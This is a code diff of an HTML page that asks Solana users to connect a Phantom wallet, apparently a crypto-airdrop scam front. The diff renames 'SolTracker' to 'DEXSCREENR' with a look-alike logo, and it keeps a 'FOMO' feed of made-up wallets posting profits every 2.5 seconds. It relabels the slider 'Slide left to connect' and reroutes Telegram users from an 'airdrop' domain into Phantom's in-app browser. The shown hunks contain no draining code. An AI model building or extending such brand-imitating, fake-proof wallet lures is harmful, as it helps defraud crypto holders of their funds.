@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>SolTracker | Live Alpha</title>
+<title>DEXSCREENR</title>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
 <script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
@@ -42,50 +42,22 @@
   .header {
     display: flex;
     align-items: center;
-    gap: 8px;
-    margin-bottom: 20px;
-    opacity: 0.8;
+    gap: 10px;
+    margin-bottom: 32px;
   }
 
-  .header svg { width: 18px; height: 18px; }
-  .header span { font-size: 13px; font-weight: 600; letter-spacing: 0.5px; color: #ffffff; text-transform: uppercase; }
-
-  .status-icon {
-    width: 64px; height: 64px;
-    background: rgba(20, 241, 149, 0.1);
-    border: 1px solid rgba(20, 241, 149, 0.2);
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    margin-bottom: 16px;
-    position: relative;
-    color: #14F195;
-  }
-
-  .status-icon::after {
-    content: '';
-    position: absolute;
-    width: 100%; height: 100%;
-    border-radius: 50%;
-    border-top: 1px solid rgba(20, 241, 149, 0.8);
-    animation: spin 2s linear infinite;
-  }
-
-  @keyframes spin { 100% { transform: rotate(360deg); } }
-
-  h1 { font-size: 22px; font-weight: 700; margin-bottom: 4px; letter-spacing: -0.5px; }
-  p.slogan { font-size: 13px; color: #ef4444; font-weight: 600; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 0.5px; display: flex; align-items: center; gap: 6px; }
-  .pulse-dot { width: 8px; height: 8px; background: #ef4444; border-radius: 50%; animation: pulse 1.5s infinite; }
-  @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); } 70% { box-shadow: 0 0 0 6px rgba(239, 68, 68, 0); } 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); } }
+  .header svg { width: 28px; height: 28px; }
+  .header span { font-size: 16px; font-weight: 700; letter-spacing: 0.5px; color: #ffffff; text-transform: uppercase; }
 
   /* FOMO Live Feed */
   .feed-container {
     width: 100%;
-    height: 160px;
+    height: 180px;
     background: rgba(0, 0, 0, 0.3);
     border: 1px solid rgba(255, 255, 255, 0.05);
     border-radius: 16px;
     padding: 12px;
-    margin-bottom: 24px;
+    margin-bottom: 32px;
     overflow: hidden;
     position: relative;
     display: flex;
@@ -100,15 +72,15 @@
     justify-content: space-between;
     align-items: center;
     background: rgba(255, 255, 255, 0.03);
-    padding: 10px 12px;
-    border-radius: 8px;
-    font-size: 12px;
+    padding: 12px 14px;
+    border-radius: 10px;
+    font-size: 13px;
     animation: slideIn 0.3s ease-out forwards;
   }
 
   @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
 
-  .feed-wallet { font-family: monospace; color: #a1a1aa; }
+  .feed-wallet { font-family: monospace; color: #a1a1aa; font-size: 12px; }
   .feed-profit { font-weight: 700; color: #14F195; }
   .feed-token { font-weight: 600; color: #ffffff; }
 
@@ -132,7 +104,7 @@
     position: absolute;
     width: 100%;
     text-align: center;
-    font-size: 13px;
+    font-size: 14px;
     font-weight: 500;
     color: rgba(255, 255, 255, 0.4);
     pointer-events: none;
@@ -189,27 +161,22 @@
 
   <div class="glass-container">
     <div class="header">
-      <svg viewBox="0 0 397 311" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M64.6 237.9c2.4-2.4 5.7-3.8 9.2-3.8h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1l62.7-62.7z" fill="#ffffff"/>
-        <path d="M64.6 3.8C67.1 1.4 70.4 0 73.8 0h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1L64.6 3.8z" fill="#ffffff"/>
-        <path d="M333.1 120.1c-2.4-2.4-5.7-3.8-9.2-3.8H6.5c-5.8 0-8.7 7-4.6 11.1l62.7 62.7c2.4 2.4 5.7 3.8 9.2 3.8h317.4c5.8 0 8.7-7 4.6-11.1l-62.7-62.7z" fill="#ffffff"/>
+      <!-- DEXSCREENR Logo -->
+      <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="35" cy="50" r="25" fill="#E0E7FF" />
+        <circle cx="65" cy="50" r="25" fill="#E0E7FF" />
+        <path d="M 25 35 L 45 35 L 35 65 L 15 65 Z" fill="#4F46E5" />
+        <path d="M 75 35 L 95 35 L 85 65 L 65 65 Z" fill="#4F46E5" />
       </svg>
-      <span>SolTracker</span>
+      <span>DEXSCREENR</span>
     </div>
-
-    <div class="status-icon">
-      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"></path></svg>
-    </div>
-
-    <h1>Live Alpha Feed</h1>
-    <p class="slogan"><span class="pulse-dot"></span> Tracking Mainnet</p>
 
     <div class="feed-container" id="feedContainer">
       <!-- Live Feed Items injected via JS -->
     </div>
 
     <div class="slider-container" id="sliderContainer">
-      <div class="slider-text" id="sliderText">Slide left to track</div>
+      <div class="slider-text" id="sliderText">Slide left to connect</div>
       <div class="slider-thumb" id="sliderThumb">
         <svg id="sliderIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg>
         <div class="spinner" id="spin"></div>
@@ -237,7 +204,7 @@
     el.className = 'feed-item';
     el.innerHTML = `
       <span class="feed-wallet">${wallet}</span>
-      <span class="feed-token">bought $${token}</span>
+      <span class="feed-token">$${token}</span>
       <span class="feed-profit">+${multiplier}x</span>
     `;
     
@@ -247,10 +214,7 @@
     }
   }
 
-  // Initial fill
   for(let i=0; i<3; i++) addFeedItem();
-  
-  // Add new item every 2.5 seconds
   setInterval(addFeedItem, 2500);
 
 
@@ -339,7 +303,7 @@
       if (window.Telegram && window.Telegram.WebApp) {
         window.Telegram.WebApp.showConfirm("Wallet connection requires Phantom. Open in Phantom app?", (confirmed) => {
           if (confirmed) {
-            const url = "https://airdrop-66m.pages.dev";
+            const url = window.location.href;
             window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
           }
         });
@@ -418,7 +382,7 @@
   function resetSlider() {
     container.classList.remove('loading');
     text.style.opacity = 1;
-    text.textContent = "Slide left to track";
+    text.textContent = "Slide left to connect";
     spin.style.display = 'none';
     icon.style.display = 'block';
     thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), width 0.3s ease, border-radius 0.3s ease';
